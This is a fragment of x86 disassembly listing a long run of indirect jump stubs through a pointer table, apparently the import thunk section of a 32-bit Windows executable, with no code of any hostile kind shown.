  41c33c:	jmp    DWORD PTR ds:0x41ee78
  41c342:	jmp    DWORD PTR ds:0x41ee7c
  41c348:	jmp    DWORD PTR ds:0x41ee80
  41c34e:	jmp    DWORD PTR ds:0x41ee84
  41c354:	jmp    DWORD PTR ds:0x41ee88
  41c35a:	jmp    DWORD PTR ds:0x41ee8c
  41c360:	jmp    DWORD PTR ds:0x41ee90
  41c366:	jmp    DWORD PTR ds:0x41ee94
  41c36c:	jmp    DWORD PTR ds:0x41ee98
  41c372:	jmp    DWORD PTR ds:0x41ee9c
  41c378:	jmp    DWORD PTR ds:0x41eea0
  41c37e:	jmp    DWORD PTR ds:0x41eea4
  41c384:	jmp    DWORD PTR ds:0x41eea8
  41c38a:	jmp    DWORD PTR ds:0x41eeac
  41c390:	jmp    DWORD PTR ds:0x41eeb0
  41c396:	jmp    DWORD PTR ds:0x41eeb4
  41c39c:	jmp    DWORD PTR ds:0x41eeb8
  41c3a2:	jmp    DWORD PTR ds:0x41eebc
  41c3a8:	jmp    DWORD PTR ds:0x41eec0
  41c3ae:	jmp    DWORD PTR ds:0x41eec4
  41c3b4:	jmp    DWORD PTR ds:0x41eec8
  41c3ba:	jmp    DWORD PTR ds:0x41eecc
  41c3c0:	jmp    DWORD PTR ds:0x41eed0
  41c3c6:	jmp    DWORD PTR ds:0x41eed4
  41c3cc:	jmp    DWORD PTR ds:0x41eed8
  41c3d2:	jmp    DWORD PTR ds:0x41eedc
  41c3d8:	jmp    DWORD PTR ds:0x41eee0
  41c3de:	jmp    DWORD PTR ds:0x41eee4
  41c3e4:	jmp    DWORD PTR ds:0x41eee8
  41c3ea:	jmp    DWORD PTR ds:0x41eeec
  41c3f0:	jmp    DWORD PTR ds:0x41eef0
  41c3f6:	jmp    DWORD PTR ds:0x41eef4
  41c3fc:	jmp    DWORD PTR ds:0x41eef8
  41c402:	jmp    DWORD PTR ds:0x41eefc
  41c408:	jmp    DWORD PTR ds:0x41ef00
  41c40e:	jmp    DWORD PTR ds:0x41ef04
  41c414:	jmp    DWORD PTR ds:0x41ef08
  41c41a:	jmp    DWORD PTR ds:0x41ef0c
  41c420:	jmp    DWORD PTR ds:0x41ef10
  41c426:	jmp    DWORD PTR ds:0x41ef14
  41c42c:	jmp    DWORD PTR ds:0x41ef18
  41c432:	jmp    DWORD PTR ds:0x41ef1c
  41c438:	jmp    DWORD PTR ds:0x41ef20
  41c43e:	jmp    DWORD PTR ds:0x41ef24
  41c444:	jmp    DWORD PTR ds:0x41ef28
  41c44a:	jmp    DWORD PTR ds:0x41ef2c
  41c450:	jmp    DWORD PTR ds:0x41ef30
  41c456:	jmp    DWORD PTR ds:0x41ef34
  41c45c:	jmp    DWORD PTR ds:0x41ef38
  41c462:	jmp    DWORD PTR ds:0x41ef3c
  41c468:	jmp    DWORD PTR ds:0x41ef40
  41c46e:	jmp    DWORD PTR ds:0x41ef44
  41c474:	jmp    DWORD PTR ds:0x41ef48
  41c47a:	jmp    DWORD PTR ds:0x41ef4c
  41c480:	jmp    DWORD PTR ds:0x41ef50
  41c486:	jmp    DWORD PTR ds:0x41ef54
  41c48c:	jmp    DWORD PTR ds:0x41ef58
  41c492:	jmp    DWORD PTR ds:0x41ef5c
  41c498:	jmp    DWORD PTR ds:0x41ef60
  41c49e:	jmp    DWORD PTR ds:0x41ef64
  41c4a4:	jmp    DWORD PTR ds:0x41ef68
  41c4aa:	jmp    DWORD PTR ds:0x41ef6c
  41c4b0:	jmp    DWORD PTR ds:0x41ef70
  41c4b6:	jmp    DWORD PTR ds:0x41ef74
  41c4bc:	jmp    DWORD PTR ds:0x41ef78
  41c4c2:	jmp    DWORD PTR ds:0x41ef7c
  41c4c8:	jmp    DWORD PTR ds:0x41ef80
  41c4ce:	jmp    DWORD PTR ds:0x41ef84
  41c4d4:	jmp    DWORD PTR ds:0x41ef88
  41c4da:	jmp    DWORD PTR ds:0x41ef8c
  41c4e0:	jmp    DWORD PTR ds:0x41ef90
  41c4e6:	jmp    DWORD PTR ds:0x41ef94
  41c4ec:	jmp    DWORD PTR ds:0x41ef98
  41c4f2:	jmp    DWORD PTR ds:0x41ef9c
  41c4f8:	jmp    DWORD PTR ds:0x41efa0
  41c4fe:	jmp    DWORD PTR ds:0x41efa4
  41c504:	jmp    DWORD PTR ds:0x41efa8
  41c50a:	jmp    DWORD PTR ds:0x41efac
  41c510:	jmp    DWORD PTR ds:0x41efb0
  41c516:	jmp    DWORD PTR ds:0x41efb4
  41c51c:	jmp    DWORD PTR ds:0x41efb8
  41c522:	jmp    DWORD PTR ds:0x41efbc
  41c528:	jmp    DWORD PTR ds:0x41efc0
  41c52e:	jmp    DWORD PTR ds:0x41efc4
  41c534:	jmp    DWORD PTR ds:0x41efc8
  41c53a:	jmp    DWORD PTR ds:0x41efcc
  41c540:	jmp    DWORD PTR ds:0x41efd0
  41c546:	jmp    DWORD PTR ds:0x41efd4
  41c54c:	jmp    DWORD PTR ds:0x41efd8
  41c552:	jmp    DWORD PTR ds:0x41efdc
  41c558:	jmp    DWORD PTR ds:0x41efe0
  41c55e:	jmp    DWORD PTR ds:0x41efe4
  41c564:	jmp    DWORD PTR ds:0x41efe8
  41c56a:	jmp    DWORD PTR ds:0x41efec
  41c570:	jmp    DWORD PTR ds:0x41eff0
  41c576:	jmp    DWORD PTR ds:0x41eff4
  41c57c:	jmp    DWORD PTR ds:0x41eff8
  41c582:	jmp    DWORD PTR ds:0x41effc
  41c588:	jmp    DWORD PTR ds:0x41f000
  41c58e:	jmp    DWORD PTR ds:0x41f004
  41c594:	jmp    DWORD PTR ds:0x41f008
  41c59a:	jmp    DWORD PTR ds:0x41f00c
  41c5a0:	jmp    DWORD PTR ds:0x41f010
  41c5a6:	jmp    DWORD PTR ds:0x41f014
  41c5ac:	jmp    DWORD PTR ds:0x41f018
  41c5b2:	jmp    DWORD PTR ds:0x41f01c
  41c5b8:	jmp    DWORD PTR ds:0x41f020
  41c5be:	jmp    DWORD PTR ds:0x41f024
  41c5c4:	jmp    DWORD PTR ds:0x41f028
  41c5ca:	jmp    DWORD PTR ds:0x41f02c
  41c5d0:	jmp    DWORD PTR ds:0x41f030
  41c5d6:	jmp    DWORD PTR ds:0x41f034
  41c5dc:	jmp    DWORD PTR ds:0x41f038
  41c5e2:	jmp    DWORD PTR ds:0x41f03c
  41c5e8:	jmp    DWORD PTR ds:0x41f040
  41c5ee:	jmp    DWORD PTR ds:0x41f044
  41c5f4:	jmp    DWORD PTR ds:0x41f048
  41c5fa:	jmp    DWORD PTR ds:0x41f04c
  41c600:	jmp    DWORD PTR ds:0x41f050
  41c606:	jmp    DWORD PTR ds:0x41f054
  41c60c:	jmp    DWORD PTR ds:0x41f058
  41c612:	jmp    DWORD PTR ds:0x41f05c
  41c618:	jmp    DWORD PTR ds:0x41f060
  41c61e:	jmp    DWORD PTR ds:0x41f064
  41c624:	jmp    DWORD PTR ds:0x41f068
  41c62a:	jmp    DWORD PTR ds:0x41f06c
  41c630:	jmp    DWORD PTR ds:0x41f070
  41c636:	jmp    DWORD PTR ds:0x41f078
  41c63c:	jmp    DWORD PTR ds:0x41f07c
  41c642:	jmp    DWORD PTR ds:0x41f080
  41c648:	jmp    DWORD PTR ds:0x41f084
  41c64e:	jmp    DWORD PTR ds:0x41f088
  41c654:	jmp    DWORD PTR ds:0x41f08c
  41c65a:	jmp    DWORD PTR ds:0x41f090
  41c660:	jmp    DWORD PTR ds:0x41f094
  41c666:	jmp    DWORD PTR ds:0x41f098
  41c66c:	jmp    DWORD PTR ds:0x41f09c
  41c672:	jmp    DWORD PTR ds:0x41f0a0
  41c678:	jmp    DWORD PTR ds:0x41f0a4
  41c67e:	jmp    DWORD PTR ds:0x41f0a8
  41c684:	jmp    DWORD PTR ds:0x41f0ac
  41c68a:	jmp    DWORD PTR ds:0x41f0b0
  41c690:	jmp    DWORD PTR ds:0x41f0b4
  41c696:	jmp    DWORD PTR ds:0x41f0b8
  41c69c:	jmp    DWORD PTR ds:0x41f0bc
  41c6a2:	jmp    DWORD PTR ds:0x41f0c0
  41c6a8:	jmp    DWORD PTR ds:0x41f0c4
  41c6ae:	jmp    DWORD PTR ds:0x41f0c8
  41c6b4:	jmp    DWORD PTR ds:0x41f0cc
  41c6ba:	jmp    DWORD PTR ds:0x41f0d0
  41c6c0:	jmp    DWORD PTR ds:0x41f0d4
  41c6c6:	jmp    DWORD PTR ds:0x41f0d8
  41c6cc:	jmp    DWORD PTR ds:0x41f0dc
  41c6d2:	jmp    DWORD PTR ds:0x41f0e0
  41c6d8:	jmp    DWORD PTR ds:0x41f0e4
  41c6de:	jmp    DWORD PTR ds:0x41f0e8
  41c6e4:	jmp    DWORD PTR ds:0x41f0ec
  41c6ea:	jmp    DWORD PTR ds:0x41f0f0
  41c6f0:	jmp    DWORD PTR ds:0x41f0f4
  41c6f6:	jmp    DWORD PTR ds:0x41f0f8
  41c6fc:	jmp    DWORD PTR ds:0x41f0fc
  41c702:	jmp    DWORD PTR ds:0x41f100
  41c708:	jmp    DWORD PTR ds:0x41f104
  41c70e:	jmp    DWORD PTR ds:0x41f108
  41c714:	jmp    DWORD PTR ds:0x41f10c
  41c71a:	jmp    DWORD PTR ds:0x41f110
  41c720:	jmp    DWORD PTR ds:0x41f114
  41c726:	jmp    DWORD PTR ds:0x41f118
  41c72c:	jmp    DWORD PTR ds:0x41f11c
  41c732:	jmp    DWORD PTR ds:0x41f120
  41c738:	jmp    DWORD PTR ds:0x41f124
  41c73e:	jmp    DWORD PTR ds:0x41f128
  41c744:	jmp    DWORD PTR ds:0x41f12c
  41c74a:	jmp    DWORD PTR ds:0x41f130
  41c750:	jmp    DWORD PTR ds:0x41f134
  41c756:	jmp    DWORD PTR ds:0x41f138
  41c75c:	jmp    DWORD PTR ds:0x41f13c
  41c762:	jmp    DWORD PTR ds:0x41f140
  41c768:	jmp    DWORD PTR ds:0x41f144
  41c76e:	jmp    DWORD PTR ds:0x41f148
  41c774:	jmp    DWORD PTR ds:0x41f14c
  41c77a:	jmp    DWORD PTR ds:0x41f150
  41c780:	jmp    DWORD PTR ds:0x41f154
  41c786:	jmp    DWORD PTR ds:0x41f158
  41c78c:	jmp    DWORD PTR ds:0x41f15c
  41c792:	jmp    DWORD PTR ds:0x41f160
  41c798:	jmp    DWORD PTR ds:0x41f164
  41c79e:	jmp    DWORD PTR ds:0x41f168
  41c7a4:	jmp    DWORD PTR ds:0x41f16c
  41c7aa:	jmp    DWORD PTR ds:0x41f170
  41c7b0:	jmp    DWORD PTR ds:0x41f174
  41c7b6:	jmp    DWORD PTR ds:0x41f178
  41c7bc:	jmp    DWORD PTR ds:0x41f17c
  41c7c2:	jmp    DWORD PTR ds:0x41f180
  41c7c8:	jmp    DWORD PTR ds:0x41f184
  41c7ce:	jmp    DWORD PTR ds:0x41f188
  41c7d4:	jmp    DWORD PTR ds:0x41f18c
  41c7da:	jmp    DWORD PTR ds:0x41f190
  41c7e0:	jmp    DWORD PTR ds:0x41f194
  41c7e6:	jmp    DWORD PTR ds:0x41f198
  41c7ec:	jmp    DWORD PTR ds:0x41f19c
  41c7f2:	jmp    DWORD PTR ds:0x41f1a0
  41c7f8:	jmp    DWORD PTR ds:0x41f1a4
  41c7fe:	jmp    DWORD PTR ds:0x41f1a8
  41c804:	jmp    DWORD PTR ds:0x41f1ac
  41c80a:	jmp    DWORD PTR ds:0x41f1b0
  41c810:	jmp    DWORD PTR ds:0x41f1b4
  41c816:	jmp    DWORD PTR ds:0x41f1b8
  41c81c:	jmp    DWORD PTR ds:0x41f1bc
  41c822:	jmp    DWORD PTR ds:0x41f1c0
  41c828:	jmp    DWORD PTR ds:0x41f1c4
  41c82e:	jmp    DWORD PTR ds:0x41f1c8
  41c834:	jmp    DWORD PTR ds:0x41f1cc
  41c83a:	jmp    DWORD PTR ds:0x41f1d0
  41c840:	jmp    DWORD PTR ds:0x41f1d4
  41c846:	jmp    DWORD PTR ds:0x41f1d8
  41c84c:	jmp    DWORD PTR ds:0x41f1dc
  41c852:	jmp    DWORD PTR ds:0x41f1e0
  41c858:	jmp    DWORD PTR ds:0x41f1e4
  41c85e:	jmp    DWORD PTR ds:0x41f1e8
  41c864:	jmp    DWORD PTR ds:0x41f1ec
  41c86a:	jmp    DWORD PTR ds:0x41f1f0
  41c870:	jmp    DWORD PTR ds:0x41f1f4
  41c876:	jmp    DWORD PTR ds:0x41f1f8
  41c87c:	jmp    DWORD PTR ds:0x41f1fc
  41c882:	jmp    DWORD PTR ds:0x41f200
  41c888:	jmp    DWORD PTR ds:0x41f204
  41c88e:	jmp    DWORD PTR ds:0x41f208
  41c894:	jmp    DWORD PTR ds:0x41f20c
  41c89a:	jmp    DWORD PTR ds:0x41f210
  41c8a0:	jmp    DWORD PTR ds:0x41f214
  41c8a6:	jmp    DWORD PTR ds:0x41f218
  41c8ac:	jmp    DWORD PTR ds:0x41f21c
  41c8b2:	jmp    DWORD PTR ds:0x41f220
  41c8b8:	jmp    DWORD PTR ds:0x41f224
  41c8be:	jmp    DWORD PTR ds:0x41f228
  41c8c4:	jmp    DWORD PTR ds:0x41f22c
  41c8ca:	jmp    DWORD PTR ds:0x41f230
  41c8d0:	jmp    DWORD PTR ds:0x41f234
  41c8d6:	jmp    DWORD PTR ds:0x41f238
  41c8dc:	jmp    DWORD PTR ds:0x41f23c
  41c8e2:	jmp    DWORD PTR ds:0x41f240
  41c8e8:	jmp    DWORD PTR ds:0x41f244
  41c8ee:	jmp    DWORD PTR ds:0x41f248
  41c8f4:	jmp    DWORD PTR ds:0x41f24c
  41c8fa:	jmp    DWORD PTR ds:0x41f250
  41c900:	jmp    DWORD PTR ds:0x41f254
  41c906:	jmp    DWORD PTR ds:0x41f258
  41c90c:	jmp    DWORD PTR ds:0x41f25c
  41c912:	jmp    DWORD PTR ds:0x41f260
  41c918:	jmp    DWORD PTR ds:0x41f264
  41c91e:	jmp    DWORD PTR ds:0x41f268
  41c924:	jmp    DWORD PTR ds:0x41f26c
  41c92a:	jmp    DWORD PTR ds:0x41f270
  41c930:	jmp    DWORD PTR ds:0x41f274
  41c936:	jmp    DWORD PTR ds:0x41f278
  41c93c:	jmp    DWORD PTR ds:0x41f27c
  41c942:	jmp    DWORD PTR ds:0x41f280
  41c948:	jmp    DWORD PTR ds:0x41f284
  41c94e:	jmp    DWORD PTR ds:0x41f288
  41c954:	jmp    DWORD PTR ds:0x41f28c
  41c95a:	jmp    DWORD PTR ds:0x41f290
  41c960:	jmp    DWORD PTR ds:0x41f294
  41c966:	jmp    DWORD PTR ds:0x41f298
  41c96c:	jmp    DWORD PTR ds:0x41f29c
  41c972:	jmp    DWORD PTR ds:0x41f2a0
  41c978:	jmp    DWORD PTR ds:0x41f2a4
  41c97e:	jmp    DWORD PTR ds:0x41f2a8
  41c984:	jmp    DWORD PTR ds:0x41f2ac
  41c98a:	jmp    DWORD PTR ds:0x41f2b0
  41c990:	jmp    DWORD PTR ds:0x41f2b4
  41c996:	jmp    DWORD PTR ds:0x41f2b8
  41c99c:	jmp    DWORD PTR ds:0x41f2bc
  41c9a2:	jmp    DWORD PTR ds:0x41f2c0
  41c9a8:	jmp    DWORD PTR ds:0x41f2c4
  41c9ae:	jmp    DWORD PTR ds:0x41f2c8
  41c9b4:	jmp    DWORD PTR ds:0x41f2cc
  41c9ba:	jmp    DWORD PTR ds:0x41f2d0
  41c9c0:	jmp    DWORD PTR ds:0x41f2d4
  41c9c6:	jmp    DWORD PTR ds:0x41f2d8
  41c9cc:	jmp    DWORD PTR ds:0x41f2dc
  41c9d2:	jmp    DWORD PTR ds:0x41f2e0
  41c9d8:	jmp    DWORD PTR ds:0x41f2e4
  41c9de:	jmp    DWORD PTR ds:0x41f2e8
  41c9e4:	jmp    DWORD PTR ds:0x41f2ec
  41c9ea:	jmp    DWORD PTR ds:0x41f2f0
  41c9f0:	jmp    DWORD PTR ds:0x41f2f4
  41c9f6:	jmp    DWORD PTR ds:0x41f2f8
  41c9fc:	jmp    DWORD PTR ds:0x41f2fc
  41ca02:	jmp    DWORD PTR ds:0x41f300
  41ca08:	jmp    DWORD PTR ds:0x41f304
  41ca0e:	jmp    DWORD PTR ds:0x41f308
  41ca14:	jmp    DWORD PTR ds:0x41f30c
  41ca1a:	jmp    DWORD PTR ds:0x41f310
  41ca20:	jmp    DWORD PTR ds:0x41f314
  41ca26:	jmp    DWORD PTR ds:0x41f318
  41ca2c:	jmp    DWORD PTR ds:0x41f31c
  41ca32:	jmp    DWORD PTR ds:0x41f320
  41ca38:	jmp    DWORD PTR ds:0x41f324
  41ca3e:	jmp    DWORD PTR ds:0x41f328
  41ca44:	jmp    DWORD PTR ds:0x41f32c
  41ca4a:	jmp    DWORD PTR ds:0x41f330
  41ca50:	jmp    DWORD PTR ds:0x41f334
  41ca56:	jmp    DWORD PTR ds:0x41f338
  41ca5c:	jmp    DWORD PTR ds:0x41f33c
  41ca62:	jmp    DWORD PTR ds:0x41f340
  41ca68:	jmp    DWORD PTR ds:0x41f344
  41ca6e:	jmp    DWORD PTR ds:0x41f348
  41ca74:	jmp    DWORD PTR ds:0x41f34c
  41ca7a:	jmp    DWORD PTR ds:0x41f350
  41ca80:	jmp    DWORD PTR ds:0x41f354
  41ca86:	jmp    DWORD PTR ds:0x41f358
  41ca8c:	jmp    DWORD PTR ds:0x41f35c
  41ca92:	jmp    DWORD PTR ds:0x41f360
  41ca98:	jmp    DWORD PTR ds:0x41f364
  41ca9e:	jmp    DWORD PTR ds:0x41f368
  41caa4:	jmp    DWORD PTR ds:0x41f36c
  41caaa:	jmp    DWORD PTR ds:0x41f370
  41cab0:	jmp    DWORD PTR ds:0x41f374
  41cab6:	jmp    DWORD PTR ds:0x41f378
  41cabc:	jmp    DWORD PTR ds:0x41f37c
  41cac2:	jmp    DWORD PTR ds:0x41f380
  41cac8:	jmp    DWORD PTR ds:0x41f384
  41cace:	jmp    DWORD PTR ds:0x41f388
  41cad4:	jmp    DWORD PTR ds:0x41f38c
  41cada:	jmp    DWORD PTR ds:0x41f390
  41cae0:	jmp    DWORD PTR ds:0x41f394
  41cae6:	jmp    DWORD PTR ds:0x41f398
  41caec:	jmp    DWORD PTR ds:0x41f39c
  41caf2:	jmp    DWORD PTR ds:0x41f3a0
  41caf8:	jmp    DWORD PTR ds:0x41f3a4
  41cafe:	jmp    DWORD PTR ds:0x41f3a8
  41cb04:	jmp    DWORD PTR ds:0x41f3ac
  41cb0a:	jmp    DWORD PTR ds:0x41f3b0
  41cb10:	jmp    DWORD PTR ds:0x41f3b4
  41cb16:	jmp    DWORD PTR ds:0x41f3b8
  41cb1c:	jmp    DWORD PTR ds:0x41f3bc
  41cb22:	jmp    DWORD PTR ds:0x41f3c0
  41cb28:	jmp    DWORD PTR ds:0x41f3c4
  41cb2e:	jmp    DWORD PTR ds:0x41f3c8
  41cb34:	jmp    DWORD PTR ds:0x41f3cc
  41cb3a:	jmp    DWORD PTR ds:0x41f3d0
  41cb40:	jmp    DWORD PTR ds:0x41f3d4
  41cb46:	jmp    DWORD PTR ds:0x41f3d8
  41cb4c:	jmp    DWORD PTR ds:0x41f3dc
  41cb52:	jmp    DWORD PTR ds:0x41f3e0
  41cb58:	jmp    DWORD PTR ds:0x41f3e4
  41cb5e:	jmp    DWORD PTR ds:0x41f3e8
  41cb64:	jmp    DWORD PTR ds:0x41f3ec
  41cb6a:	jmp    DWORD PTR ds:0x41f3f0
  41cb70:	jmp    DWORD PTR ds:0x41f3f4
  41cb76:	jmp    DWORD PTR ds:0x41f3f8
  41cb7c:	jmp    DWORD PTR ds:0x41f3fc
  41cb82:	jmp    DWORD PTR ds:0x41f400
  41cb88:	jmp    DWORD PTR ds:0x41f404
  41cb8e:	jmp    DWORD PTR ds:0x41f408
  41cb94:	jmp    DWORD PTR ds:0x41f40c
  41cb9a:	jmp    DWORD PTR ds:0x41f410
  41cba0:	jmp    DWORD PTR ds:0x41f414
  41cba6:	jmp    DWORD PTR ds:0x41f418
  41cbac:	jmp    DWORD PTR ds:0x41f41c
  41cbb2:	jmp    DWORD PTR ds:0x41f420
  41cbb8:	jmp    DWORD PTR ds:0x41f424
  41cbbe:	jmp    DWORD PTR ds:0x41f428
  41cbc4:	jmp    DWORD PTR ds:0x41f42c
  41cbca:	jmp    DWORD PTR ds:0x41f430
  41cbd0:	jmp    DWORD PTR ds:0x41f434
  41cbd6:	jmp    DWORD PTR ds:0x41f438
  41cbdc:	jmp    DWORD PTR ds:0x41f43c
  41cbe2:	jmp    DWORD PTR ds:0x41f440
  41cbe8:	jmp    DWORD PTR ds:0x41f444
  41cbee:	jmp    DWORD PTR ds:0x41f448
  41cbf4:	jmp    DWORD PTR ds:0x41f44c
  41cbfa:	jmp    DWORD PTR ds:0x41f454
  41cc00:	jmp    DWORD PTR ds:0x41f45c
  41cc06:	jmp    DWORD PTR ds:0x41f460
  41cc0c:	jmp    DWORD PTR ds:0x41f464
  41cc12:	jmp    DWORD PTR ds:0x41f468
  41cc18:	jmp    DWORD PTR ds:0x41f46c
  41cc1e:	jmp    DWORD PTR ds:0x41f470
  41cc24:	jmp    DWORD PTR ds:0x41f474
  41cc2a:	jmp    DWORD PTR ds:0x41f478
  41cc30:	jmp    DWORD PTR ds:0x41f47c
  41cc36:	jmp    DWORD PTR ds:0x41f480
  41cc3c:	jmp    DWORD PTR ds:0x41f484
  41cc42:	jmp    DWORD PTR ds:0x41f488
  41cc48:	jmp    DWORD PTR ds:0x41f48c
  41cc4e:	jmp    DWORD PTR ds:0x41f490
  41cc54:	jmp    DWORD PTR ds:0x41f494
  41cc5a:	jmp    DWORD PTR ds:0x41f498
  41cc60:	jmp    DWORD PTR ds:0x41f49c
  41cc66:	jmp    DWORD PTR ds:0x41f4a0
  41cc6c:	jmp    DWORD PTR ds:0x41f4a4
  41cc72:	jmp    DWORD PTR ds:0x41f4a8
  41cc78:	jmp    DWORD PTR ds:0x41f4ac
  41cc7e:	jmp    DWORD PTR ds:0x41f4b0
  41cc84:	jmp    DWORD PTR ds:0x41f4b4
  41cc8a:	jmp    DWORD PTR ds:0x41f4b8
  41cc90:	jmp    DWORD PTR ds:0x41f4bc
  41cc96:	jmp    DWORD PTR ds:0x41f4c0
  41cc9c:	jmp    DWORD PTR ds:0x41f4c4
  41cca2:	jmp    DWORD PTR ds:0x41f4c8
  41cca8:	jmp    DWORD PTR ds:0x41f4cc
  41ccae:	jmp    DWORD PTR ds:0x41f4d0
  41ccb4:	jmp    DWORD PTR ds:0x41f4d4
  41ccba:	jmp    DWORD PTR ds:0x41f4d8
  41ccc0:	jmp    DWORD PTR ds:0x41f4dc
  41ccc6:	jmp    DWORD PTR ds:0x41f4e0
  41cccc:	jmp    DWORD PTR ds:0x41f4e4
  41ccd2:	jmp    DWORD PTR ds:0x41f4e8
  41ccd8:	jmp    DWORD PTR ds:0x41f4ec
  41ccde:	jmp    DWORD PTR ds:0x41f4f0
  41cce4:	jmp    DWORD PTR ds:0x41f4f4
  41ccea:	jmp    DWORD PTR ds:0x41f4f8
  41ccf0:	jmp    DWORD PTR ds:0x41f4fc
  41ccf6:	jmp    DWORD PTR ds:0x41f500
  41ccfc:	jmp    DWORD PTR ds:0x41f504
  41cd02:	jmp    DWORD PTR ds:0x41f508
  41cd08:	jmp    DWORD PTR ds:0x41f50c
  41cd0e:	jmp    DWORD PTR ds:0x41f510
  41cd14:	jmp    DWORD PTR ds:0x41f514
  41cd1a:	jmp    DWORD PTR ds:0x41f518
  41cd20:	jmp    DWORD PTR ds:0x41f51c
  41cd26:	jmp    DWORD PTR ds:0x41f520
  41cd2c:	jmp    DWORD PTR ds:0x41f524
  41cd32:	jmp    DWORD PTR ds:0x41f528
  41cd38:	jmp    DWORD PTR ds:0x41f52c
  41cd3e:	jmp    DWORD PTR ds:0x41f530
  41cd44:	jmp    DWORD PTR ds:0x41f534
  41cd4a:	jmp    DWORD PTR ds:0x41f538
  41cd50:	jmp    DWORD PTR ds:0x41f53c
  41cd56:	jmp    DWORD PTR ds:0x41f540
  41cd5c:	jmp    DWORD PTR ds:0x41f544
  41cd62:	jmp    DWORD PTR ds:0x41f548
  41cd68:	jmp    DWORD PTR ds:0x41f54c
  41cd6e:	jmp    DWORD PTR ds:0x41f550
  41cd74:	jmp    DWORD PTR ds:0x41f554
  41cd7a:	jmp    DWORD PTR ds:0x41f558
  41cd80:	jmp    DWORD PTR ds:0x41f55c
  41cd86:	jmp    DWORD PTR ds:0x41f560
  41cd8c:	jmp    DWORD PTR ds:0x41f564
  41cd92:	jmp    DWORD PTR ds:0x41f568
  41cd98:	jmp    DWORD PTR ds:0x41f56c
  41cd9e:	jmp    DWORD PTR ds:0x41f570
  41cda4:	jmp    DWORD PTR ds:0x41f574
  41cdaa:	jmp    DWORD PTR ds:0x41f578
  41cdb0:	jmp    DWORD PTR ds:0x41f57c
  41cdb6:	jmp    DWORD PTR ds:0x41f580
  41cdbc:	jmp    DWORD PTR ds:0x41f584
  41cdc2:	jmp    DWORD PTR ds:0x41f588
  41cdc8:	jmp    DWORD PTR ds:0x41f58c
  41cdce:	jmp    DWORD PTR ds:0x41f590
  41cdd4:	jmp    DWORD PTR ds:0x41f594
  41cdda:	jmp    DWORD PTR ds:0x41f598
  41cde0:	jmp    DWORD PTR ds:0x41f59c
  41cde6:	jmp    DWORD PTR ds:0x41f5a0
  41cdec:	jmp    DWORD PTR ds:0x41f5a4
  41cdf2:	jmp    DWORD PTR ds:0x41f5a8
  41cdf8:	jmp    DWORD PTR ds:0x41f5ac
  41cdfe:	jmp    DWORD PTR ds:0x41f5b0
  41ce04:	jmp    DWORD PTR ds:0x41f5b4
  41ce0a:	jmp    DWORD PTR ds:0x41f5b8
  41ce10:	jmp    DWORD PTR ds:0x41f5bc
  41ce16:	jmp    DWORD PTR ds:0x41f5c0
  41ce1c:	jmp    DWORD PTR ds:0x41f5c4
  41ce22:	jmp    DWORD PTR ds:0x41f5c8
  41ce28:	jmp    DWORD PTR ds:0x41f5cc
  41ce2e:	jmp    DWORD PTR ds:0x41f5d0
  41ce34:	jmp    DWORD PTR ds:0x41f5d4
  41ce3a:	jmp    DWORD PTR ds:0x41f5d8
  41ce40:	jmp    DWORD PTR ds:0x41f5dc
  41ce46:	jmp    DWORD PTR ds:0x41f5e0
  41ce4c:	jmp    DWORD PTR ds:0x41f5e4
  41ce52:	jmp    DWORD PTR ds:0x41f5e8
  41ce58:	jmp    DWORD PTR ds:0x41f5ec
  41ce5e:	jmp    DWORD PTR ds:0x41f5f0
  41ce64:	jmp    DWORD PTR ds:0x41f5f4
  41ce6a:	jmp    DWORD PTR ds:0x41f5f8
  41ce70:	jmp    DWORD PTR ds:0x41f5fc
  41ce76:	jmp    DWORD PTR ds:0x41f600
  41ce7c:	jmp    DWORD PTR ds:0x41f604
  41ce82:	jmp    DWORD PTR ds:0x41f608
  41ce88:	jmp    DWORD PTR ds:0x41f60c
  41ce8e:	jmp    DWORD PTR ds:0x41f610
  41ce94:	jmp    DWORD PTR ds:0x41f614
  41ce9a:	jmp    DWORD PTR ds:0x41f618
  41cea0:	jmp    DWORD PTR ds:0x41f61c
  41cea6:	jmp    DWORD PTR ds:0x41f620
  41ceac:	jmp    DWORD PTR ds:0x41f624
  41ceb2:	jmp    DWORD PTR ds:0x41f628
  41ceb8:	jmp    DWORD PTR ds:0x41f62c
  41cebe:	jmp    DWORD PTR ds:0x41f630
  41cec4:	jmp    DWORD PTR ds:0x41f634
  41ceca:	jmp    DWORD PTR ds:0x41f638
  41ced0:	jmp    DWORD PTR ds:0x41f63c
  41ced6:	jmp    DWORD PTR ds:0x41f640
  41cedc:	jmp    DWORD PTR ds:0x41f644
  41cee2:	jmp    DWORD PTR ds:0x41f648
  41cee8:	jmp    DWORD PTR ds:0x41f64c
  41ceee:	jmp    DWORD PTR ds:0x41f650
  41cef4:	jmp    DWORD PTR ds:0x41f654
  41cefa:	jmp    DWORD PTR ds:0x41f658
  41cf00:	jmp    DWORD PTR ds:0x41f65c
  41cf06:	jmp    DWORD PTR ds:0x41f660
  41cf0c:	jmp    DWORD PTR ds:0x41f664
  41cf12:	jmp    DWORD PTR ds:0x41f668
  41cf18:	jmp    DWORD PTR ds:0x41f66c
  41cf1e:	jmp    DWORD PTR ds:0x41f670
  41cf24:	jmp    DWORD PTR ds:0x41f674
  41cf2a:	jmp    DWORD PTR ds:0x41f678
  41cf30:	jmp    DWORD PTR ds:0x41f67c
  41cf36:	jmp    DWORD PTR ds:0x41f680
  41cf3c:	jmp    DWORD PTR ds:0x41f684
  41cf42:	jmp    DWORD PTR ds:0x41f688
  41cf48:	jmp    DWORD PTR ds:0x41f68c
  41cf4e:	jmp    DWORD PTR ds:0x41f690
  41cf54:	jmp    DWORD PTR ds:0x41f694
  41cf5a:	jmp    DWORD PTR ds:0x41f698
  41cf60:	jmp    DWORD PTR ds:0x41f69c
  41cf66:	jmp    DWORD PTR ds:0x41f6a0
  41cf6c:	jmp    DWORD PTR ds:0x41f6a4
  41cf72:	jmp    DWORD PTR ds:0x41f6a8
  41cf78:	jmp    DWORD PTR ds:0x41f6ac
  41cf7e:	jmp    DWORD PTR ds:0x41f6b0
  41cf84:	jmp    DWORD PTR ds:0x41f6b4
  41cf8a:	jmp    DWORD PTR ds:0x41f6b8
  41cf90:	jmp    DWORD PTR ds:0x41f6bc
  41cf96:	jmp    DWORD PTR ds:0x41f6c0
  41cf9c:	jmp    DWORD PTR ds:0x41f6c4
  41cfa2:	jmp    DWORD PTR ds:0x41f6c8
  41cfa8:	jmp    DWORD PTR ds:0x41f6cc
  41cfae:	jmp    DWORD PTR ds:0x41f6d0
  41cfb4:	jmp    DWORD PTR ds:0x41f6d4
